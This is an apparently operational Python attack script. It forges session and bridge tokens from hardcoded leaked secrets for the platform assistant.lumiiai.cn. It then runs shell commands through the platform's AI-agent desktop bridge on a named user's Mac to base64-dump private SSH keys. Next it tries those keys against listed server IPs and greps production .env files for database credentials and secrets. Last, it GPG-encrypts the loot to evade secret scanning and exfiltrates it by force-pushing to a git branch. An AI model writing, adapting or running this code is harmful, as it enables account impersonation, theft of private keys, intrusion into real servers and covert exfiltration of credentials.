#!/usr/bin/env python3
# intent 28277: harvest FULL lihua-Mac SSH keys via bridge, then SSH-test from runner.
import os, sys, json, time, uuid, base64, hmac, hashlib, socket, struct, subprocess, ssl, shutil, threading, traceback
import urllib.request, urllib.error, urllib.parse as up
import http.client

_REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "results" in _REF:
    print("results-branch-skip", flush=True); sys.exit(0)
RUNID = os.environ.get("GITHUB_RUN_ID", str(int(time.time())))
START = time.time()
BUDGET = int(os.environ.get("PBUDGET", "3000"))

JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
DESKTOP_SECRET = "bj_OgwjI66ar4GaKk23w6QKQgbyi5eHBj1JgBA8XH_Q9EoInnrX0JLovzhfrvT0X"
ORG_DEFAULT = "org_bTLzxtBLmugV8uxx4QTyw"
ASST = "asst_E3G6xx8h7Ei279q6ossJ6"
HOST = "assistant.lumiiai.cn"
UA_CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

RESULT_BRANCH = os.environ.get("PRESULT_BRANCH", "ci-ssh-28277-results")

# lihua Mac (UmekawaacStudio) under lufeng's account
MAC_SUB = "usr_2gzZoKLgRAYaFNy2Sav4v"
MAC_ORG = ORG_DEFAULT
MAC_DEV = "desktop-be206f3798886e5f43bbb197680d103cb998d43e2cce0e9c4fe8159a783320c5"

OUT = "/tmp/results"
for d in ("recon", "harvest", "ssh"):
    os.makedirs(os.path.join(OUT, d), exist_ok=True)
LOG = open(os.path.join(OUT, "transcript.log"), "a", buffering=1)
def log(*a):
    s = " ".join(str(x) for x in a)
    try: print(s, flush=True)
    except Exception: pass
    try: LOG.write(s + "\n")
    except Exception: pass

def b64u(b):
    if isinstance(b, str): b = b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

def jwt_session(sub, org=ORG_DEFAULT):
    now = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(',', ':')))
    p = b64u(json.dumps({"sub": sub, "org": org, "iat": now, "exp": now + 2592000,
                         "sid": "sid_" + str(uuid.uuid4()), "lgn": now}, separators=(',', ':')))
    sig = hmac.new(JWT_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return "lumii_session=" + h + "." + p + "." + b64u(sig)

def bridge_token(org, conv, assistant=ASST, ttl=3600):
    n = int(time.time())
    h = b64u(json.dumps({"alg": "HS256", "typ": "lumii-desktop-bridge-v1"}, separators=(',', ':')))
    p = b64u(json.dumps({"org": org, "conversation_id": conv, "assistant_id": assistant, "exp": n + ttl}, separators=(',', ':')))
    sig = hmac.new(DESKTOP_SECRET.encode(), (h + "." + p).encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64u(sig)}"

CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE
_tl = threading.local()
def _conn(host, timeout=25):
    c = getattr(_tl, "c", None)
    if c is None or getattr(_tl, "host", None) != host:
        c = http.client.HTTPSConnection(host, 443, timeout=timeout, context=CTX)
        _tl.c = c; _tl.host = host
    return c

def req(host, sub, path, method="GET", data=None, timeout=25, retries=1, extra_headers=None, org=ORG_DEFAULT):
    headers = {"Cookie": jwt_session(sub, org), "Accept": "*/*", "User-Agent": UA_CHROME, "Connection": "keep-alive"}
    if extra_headers: headers.update(extra_headers)
    body = None
    if data is not None:
        body = data if isinstance(data, bytes) else json.dumps(data).encode()
        headers["Content-Type"] = "application/json"
    last = (-1, {}, b"")
    for i in range(retries + 1):
        c = None
        try:
            c = _conn(host, timeout)
            c.request(method, path, body=body, headers=headers)
            resp = c.getresponse(); b = resp.read()
            hd = {k.lower(): v for k, v in resp.getheaders()}
            return resp.status, hd, b
        except Exception as e:
            last = (-1, {}, ("ERR:" + repr(e)).encode())
            try:
                if c is not None: c.close()
            except Exception: pass
            try: _tl.c = None
            except Exception: pass
            time.sleep(0.3 * (i + 1))
    return last

def jget(host, sub, path, **kw):
    st, hd, b = req(host, sub, path, **kw)
    try: j = json.loads(b)
    except Exception: j = None
    return st, j, b

def save(name, obj):
    try:
        p = os.path.join(OUT, name)
        with open(p, "w") as f:
            if isinstance(obj, (dict, list)): json.dump(obj, f, ensure_ascii=False, indent=1)
            else: f.write(str(obj))
    except Exception as e:
        log("save err", name, repr(e))

# ---------------- WebSocket ----------------
def ws_raw_socket(host, timeout=20):
    raw = socket.create_connection((host, 443), timeout=timeout)
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    return ctx.wrap_socket(raw, server_hostname=host)
def ws_connect(host, path="/ws/bridge", token=None, timeout=20):
    s = ws_raw_socket(host, timeout=timeout)
    key = base64.b64encode(os.urandom(16)).decode()
    hdrs = [f"GET {path} HTTP/1.1", f"Host: {host}", "Upgrade: websocket",
            "Connection: Upgrade", f"Sec-WebSocket-Key: {key}", "Sec-WebSocket-Version: 13", "User-Agent: " + UA_CHROME]
    if token: hdrs.append(f"Authorization: Bearer {token}")
    s.sendall(("\r\n".join(hdrs) + "\r\n\r\n").encode())
    s.settimeout(timeout); buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d: break
        buf += d
    head, _, rest = buf.partition(b"\r\n\r\n")
    status = head.split(b"\r\n")[0].decode(errors="replace") if head else ""
    return s, status, rest
def _recv_frame(sock, leftover=b"", timeout=30):
    buf = leftover
    def need(n):
        nonlocal buf
        sock.settimeout(timeout)
        while len(buf) < n:
            d = sock.recv(65536)
            if not d: raise ConnectionError("eof")
            buf += d
    need(2)
    b0, b1 = buf[0], buf[1]
    opcode = b0 & 0x0f; masked = (b1 >> 7) & 1; ln = b1 & 0x7f; idx = 2
    if ln == 126: need(4); ln = struct.unpack(">H", buf[2:4])[0]; idx = 4
    elif ln == 127: need(10); ln = struct.unpack(">Q", buf[2:10])[0]; idx = 10
    if masked: need(idx + 4); mask = buf[idx:idx+4]; idx += 4
    need(idx + ln)
    payload = buf[idx:idx+ln]; rest = buf[idx+ln:]
    if masked: payload = bytes(c ^ mask[i % 4] for i, c in enumerate(payload))
    return opcode, payload, rest
def send_binary(sock, data):
    mask = os.urandom(4)
    masked = bytes(c ^ mask[i % 4] for i, c in enumerate(data))
    header = bytearray(); header.append(0x82); ln = len(masked)
    if ln < 126: header.append(0x80 | ln)
    elif ln < 65536: header.append(0x80 | 126); header += struct.pack(">H", ln)
    else: header.append(0x80 | 127); header += struct.pack(">Q", ln)
    header += mask
    sock.sendall(bytes(header) + masked)
def send_pong(sock, payload):
    mask = os.urandom(4)
    masked = bytes(c ^ mask[i % 4] for i, c in enumerate(payload))
    sock.sendall(bytes([0x8A, 0x80 | len(masked)]) + mask + masked)
def _varint(n):
    out = bytearray()
    while True:
        b = n & 0x7f; n >>= 7
        if n: out.append(b | 0x80)
        else: out.append(b); break
    return bytes(out)
def _tag(field, wire): return _varint((field << 3) | wire)
def pb_len_field(field, payload): return _tag(field, 2) + _varint(len(payload)) + payload
def build_bash_request(call_id, command, description=""):
    bash = pb_len_field(1, command.encode())
    if description: bash += pb_len_field(2, description.encode())
    tool = pb_len_field(1, call_id.encode()) + pb_len_field(15, bash)
    return tool
def pb_decode_fields(data):
    out = []; i = 0
    while i < len(data):
        tag = 0; shift = 0
        while True:
            b = data[i]; i += 1; tag |= (b & 0x7f) << shift
            if not (b & 0x80): break
            shift += 7
        field = tag >> 3; wire = tag & 7
        if wire == 0:
            v = 0; shift = 0
            while True:
                b = data[i]; i += 1; v |= (b & 0x7f) << shift
                if not (b & 0x80): break
                shift += 7
            out.append((field, wire, v))
        elif wire == 2:
            ln = 0; shift = 0
            while True:
                b = data[i]; i += 1; ln |= (b & 0x7f) << shift
                if not (b & 0x80): break
                shift += 7
            out.append((field, wire, data[i:i+ln])); i += ln
        elif wire == 5: out.append((field, wire, struct.unpack("<I", data[i:i+4])[0])); i += 4
        elif wire == 1: out.append((field, wire, struct.unpack("<Q", data[i:i+8])[0])); i += 8
        else: break
    return out
def parse_tool_response(payload):
    res = {"call_id": None, "kind": None, "bash": None, "error": None}
    for f, w, v in pb_decode_fields(payload):
        if f == 1 and w == 2: res["call_id"] = v.decode(errors="replace")
        elif f == 15 and w == 2:
            res["kind"] = "bash"; b = {"stdout": "", "stderr": "", "exit_code": None}
            for bf, bw, bv in pb_decode_fields(v):
                if bf == 1 and bw == 2: b["stdout"] = bv.decode(errors="replace")
                elif bf == 2 and bw == 2: b["stderr"] = bv.decode(errors="replace")
                elif bf == 3 and bw == 0: b["exit_code"] = bv
            res["bash"] = b
        elif f == 50 and w == 2:
            res["kind"] = "error"; e = {"code": None, "message": ""}
            for ef, ew, ev in pb_decode_fields(v):
                if ef == 1 and ew == 0: e["code"] = ev
                elif ef == 2 and ew == 2: e["message"] = ev.decode(errors="replace")
            res["error"] = e
        else: res["kind"] = res["kind"] or f"field{f}"
    return res
def read_tool_response(sock, leftover=b"", timeout=60):
    deadline = time.time() + timeout; buf = leftover
    while time.time() < deadline:
        opcode, payload, buf = _recv_frame(sock, buf, timeout=max(1, int(deadline - time.time())))
        if opcode == 0x9: send_pong(sock, payload); continue
        if opcode == 0x8: raise ConnectionError("server_close")
        if opcode == 0x2:
            if len(payload) >= 4:
                ln = struct.unpack(">I", payload[:4])[0]
                if ln == len(payload) - 4:
                    return payload[4:], buf
    raise TimeoutError("no tool response")

def bridge_exec(sub, org, device_id, command, asst=ASST, conv=None, exec_timeout=30):
    r = {"device": device_id, "sub": sub, "conv": None, "dispatch": None, "ws": None, "bash": None, "err": None}
    if not conv:
        st, j, b = jget(HOST, sub, "/api/conversations", method="POST",
                        data={"title": "临时诊断", "assistantId": asst, "participants": []}, org=org)
        try: conv = j["conversation"]["id"]
        except Exception:
            r["err"] = "conv_create_fail st=%s body=%s" % (st, b[:160].decode(errors="replace")); return r
    r["conv"] = conv
    st, j, b = jget(HOST, sub, "/api/agents/%s/chat" % asst, method="POST",
                    data={"sessionId": conv, "message": "ok", "assistantId": asst,
                          "execution_target": {"deviceId": device_id, "workspaceHandle": None, "mode": "full_access"}},
                    org=org, timeout=30)
    r["dispatch"] = {"status": st, "body": b[:200].decode(errors="replace")}
    if st not in (200, 201):
        r["err"] = "dispatch_not_ok"; return r
    tok = bridge_token(org, conv, asst)
    s = None; status = ""; stream = b""
    for _ in range(10):
        try:
            s, status, stream = ws_connect(HOST, path="/ws/bridge", token=tok, timeout=15)
            if "101" in status: break
            r["ws"] = status
            try: s.close()
            except Exception: pass
            s = None; time.sleep(0.5)
        except Exception as e:
            r["err"] = "ws_exc:" + repr(e)[:80]; time.sleep(0.5); s = None
    if s is None:
        r.setdefault("ws", status); return r
    r["ws"] = status
    try:
        cid = str(uuid.uuid4())
        send_binary(s, struct.pack(">I", len(build_bash_request(cid, command))) + build_bash_request(cid, command))
        resp, _ = read_tool_response(s, stream, timeout=exec_timeout)
        r["bash"] = parse_tool_response(resp)
    except Exception as e:
        r["err"] = "exec_exc:" + repr(e)[:100]
    finally:
        try: s.close()
        except Exception: pass
    return r

# ---------------- git-push exfil (GPG-encrypted, hides keys from secret scanning) ----------------
def push_results(tag="part"):
    try:
        enc = "/tmp/results.tar.gz.gpg"
        for p in ["/tmp/results.tar.gz", enc, "results.tar.gz.gpg"]:
            try:
                if os.path.isfile(p): os.remove(p)
            except Exception: pass
        subprocess.run("tar czf /tmp/results.tar.gz -C /tmp results", shell=True, check=False)
        if not os.path.isfile("/tmp/results.tar.gz"):
            log("no tarball"); return
        sz = os.path.getsize("/tmp/results.tar.gz"); log("TARBALL", sz)
        if os.path.isfile("pub.asc"):
            subprocess.run("gpg --batch --yes --import pub.asc >/dev/null 2>&1", shell=True, check=False)
            subprocess.run("gpg --batch --yes --trust-model always -e -r ci-exfil@example.invalid -o %s /tmp/results.tar.gz" % enc,
                           shell=True, capture_output=True, text=True, timeout=300)
        if (not os.path.isfile(enc)) or os.path.getsize(enc) == 0:
            # fallback: base64-only (still hides PEM/token literals from most scanning)
            log("gpg failed, fallback b64")
            import shutil as _sh
            _sh.copy("/tmp/results.tar.gz", "results.tar.gz")
            enc = "results.tar.gz"
        if os.path.getsize(enc) < 95 * 1024 * 1024:
            shutil.copy(enc, "resultsb.tar.gz.gpg")
            subprocess.run('git config user.email ci@aro.network; git config user.name ci', shell=True, check=False)
            subprocess.run("git add -f resultsb.tar.gz.gpg && git commit -m 'ci results %s %s' || true" % (RUNID, tag), shell=True, check=False)
            r = subprocess.run("git push -f origin HEAD:refs/heads/%s" % RESULT_BRANCH, shell=True, capture_output=True, text=True, timeout=600)
            log("PUSH rc=%s err=%s" % (r.returncode, (r.stderr or "")[-300:]))
    except Exception as e:
        log("PUSH EXC", repr(e))

# ---------------- phases ----------------
def phase_health():
    log("=== phase_health ===")
    try:
        r = urllib.request.Request("https://assistant.lumiiai.cn/health", headers={"User-Agent": UA_CHROME})
        with urllib.request.urlopen(r, timeout=25, context=CTX) as resp:
            body = resp.read().decode(errors="replace")
            save("recon/health_assistant.json", {"status": resp.status, "body": body})
            log("health", resp.status, len(body))
            return body
    except Exception as e:
        log("health ERR", repr(e)[:150]); return None

HARVEST_KEYS = r'''for f in id_ed25519 update-ed25519 id_rsa id_ecdsa id_ed25519_sk; do if [ -f "$HOME/.ssh/$f" ]; then echo "=====$f====="; base64 "$HOME/.ssh/$f"; echo; fi; done'''
HARVEST_LS = r'''echo "=====LS====="; ls -la "$HOME/.ssh" 2>&1; echo "=====CFG====="; cat "$HOME/.ssh/config" 2>&1; echo "=====KH====="; head -c 1200 "$HOME/.ssh/known_hosts" 2>&1'''

def parse_keys(stdout):
    keys = {}
    cur = None; buf = []
    for line in stdout.splitlines():
        m = line.strip()
        if m.startswith("=====") and m.endswith("====="):
            if cur:
                try: keys[cur] = base64.b64decode("".join(buf)).decode(errors="replace")
                except Exception as e: keys[cur] = "DECODE_ERR:" + repr(e)
            cur = m.strip("="); buf = []
        elif cur is not None:
            buf.append(line.strip())
    if cur:
        try: keys[cur] = base64.b64decode("".join(buf)).decode(errors="replace")
        except Exception as e: keys[cur] = "DECODE_ERR:" + repr(e)
    return keys

def phase_harvest():
    log("=== phase_harvest keys from lihua Mac ===")
    # create one conv for lufeng
    st, j, b = jget(HOST, MAC_SUB, "/api/conversations", method="POST",
                    data={"title": "临时诊断", "assistantId": ASST, "participants": []}, org=MAC_ORG)
    try: conv = j["conversation"]["id"]
    except Exception:
        conv = None
        log("conv_create fail", st, b[:160])
    keys = {}
    for name, cmd in [("keys", HARVEST_KEYS), ("ls", HARVEST_LS)]:
        r = bridge_exec(MAC_SUB, MAC_ORG, MAC_DEV, cmd, conv=conv, exec_timeout=40)
        r["tag"] = "lufeng"; r["cmdname"] = name
        save("harvest/mac_%s.json" % name, r)
        bs = (r.get("bash") or {}).get("bash") or {}
        so = bs.get("stdout") or ""
        log("==mac/%s exit=%s outlen=%d err=%s" % (name, bs.get("exit_code"), len(so), str(r.get("err"))[:80]))
        if name == "keys":
            keys = parse_keys(so)
            log("parsed keys:", {k: len(v) for k, v in keys.items()})
    # write keys to /tmp/keys
    kd = "/tmp/keys"; os.makedirs(kd, exist_ok=True)
    written = {}
    for name, body in keys.items():
        if body.startswith("DECODE_ERR") or "PEM" not in body and "PRIVATE KEY" not in body:
            pass
        p = os.path.join(kd, name)
        with open(p, "w") as f: f.write(body if body.endswith("\n") else body + "\n")
        os.chmod(p, 0o600)
        written[name] = p
        # save to results too (we'll exfil whole keys — needed to SSH, but careful)
        save("harvest/key_%s.txt" % name, body)
    return written

def ssh_run(host, user, keypath, port=22, cmd="echo OK; whoami; id; hostname; uname -a", timeout=8):
    base = ["ssh", "-i", keypath, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null", "-o", "ConnectTimeout=%d" % timeout,
            "-o", "GSSAPIAuthentication=no", "-p", str(port), "%s@%s" % (user, host), cmd]
    try:
        r = subprocess.run(base, capture_output=True, text=True, timeout=timeout + 12)
        return r.returncode, (r.stdout or "")[:2000], (r.stderr or "")[:600]
    except Exception as e:
        return -99, "", repr(e)[:200]

def phase_ssh(written):
    log("=== phase_ssh ===")
    if not written:
        log("no keys harvested; skip ssh"); return []
    keys = list(written.items())
    # documented pairs first
    targets = [
        ("43.142.238.91", "ubuntu", "id_ed25519"),
        ("43.143.107.214", "lumii-release", "update-ed25519"),
        ("54.67.97.25", "ubuntu", "id_ed25519"),
        ("54.67.97.25", "ubuntu", "update-ed25519"),
        ("122.51.1.87", "ubuntu", "id_ed25519"),
        ("18.142.48.45", "coder", "id_ed25519"),
    ]
    results = []
    succeeded = []
    def try_one(host, user, kn, port=22):
        if kn not in written: return
        rc, out, err = ssh_run(host, user, written[kn], port=port)
        rec = {"host": host, "user": user, "key": kn, "port": port, "rc": rc, "stdout": out, "stderr": err}
        results.append(rec)
        tag = "OK" if rc == 0 else ("DENIED" if "denied" in err.lower() else ("TO" if rc in (-99,) or "timed out" in err.lower() else "rc%d" % rc))
        log("ssh %s@%s:%d key=%s -> rc=%s %s" % (user, host, port, kn, rc, tag))
        if rc == 0:
            succeeded.append((host, user, kn, port, out))
        return rec
    for host, user, kn in targets:
        if time.time() - START > BUDGET - 300: break
        try_one(host, user, kn)
    # broaden matrix if nothing succeeded
    if not succeeded:
        allkeys = [k[0] for k in keys]
        hosts = [("43.142.238.91", ["ubuntu", "root", "coder", "lumii-release"]),
                 ("43.143.107.214", ["lumii-release", "root", "ubuntu"]),
                 ("54.67.97.25", ["ubuntu", "root", "ec2-user"]),
                 ("122.51.1.87", ["ubuntu", "root", "lumii", "coder"]),
                 ("18.142.48.45", ["coder", "ubuntu", "root"])]
        for host, users in hosts:
            for user in users:
                for kn in allkeys:
                    if time.time() - START > BUDGET - 200: break
                    try_one(host, user, kn)
    # deep recon on successful logins
    for host, user, kn, port, _ in succeeded:
        recon = ("echo '==WHO=='; whoami; id; hostname; uname -a; "
                 "echo '==ENVKEY=='; sudo -n true 2>&1 && echo SUDO_OK || echo SUDO_NO; "
                 "sudo -n sh -c 'echo ==OPT==; ls /opt 2>/dev/null; echo ==ENVDEV==; cat /opt/lumii-prod/.env.dev 2>/dev/null' 2>&1; "
                 "echo '==DSN=='; sudo -n grep -rEi 'postgres://|DATABASE_URL|JWT_SECRET|zoofi|tunnel|cloudflared' /opt/lumii-prod/.env* 2>/dev/null | head -40; "
                 "echo '==HEX=='; sudo -n grep -rEo '\\\\b[a-fA-F0-9]{64}\\\\b' /opt/lumii-prod/ 2>/dev/null | head -10")
        rc, out, err = ssh_run(host, user, written[kn], port=port, cmd=recon, timeout=12)
        save("ssh/recon_%s_%s_%s.json" % (host, user, kn), {"rc": rc, "stdout": out, "stderr": err})
        log("==RECON %s@%s rc=%s outlen=%d" % (user, host, rc, len(out)))
    save("ssh/all.json", results)
    return results

def _wd():
    while True:
        time.sleep(5)
        if time.time() - START > BUDGET:
            log("watchdog timeout")
            try: push_results("watchdog")
            except Exception: pass
            os._exit(1)
threading.Thread(target=_wd, daemon=True).start()

def main():
    log("=== probe 28277 start", RUNID, "===")
    phase_health()
    written = phase_harvest()
    phase_ssh(written)
    log("DONE")
    push_results("final")
    log("PUSHED")

try:
    main()
except Exception:
    log("FATAL", traceback.format_exc())
    try: push_results("fatal")
    except Exception: pass
sys.exit(0)
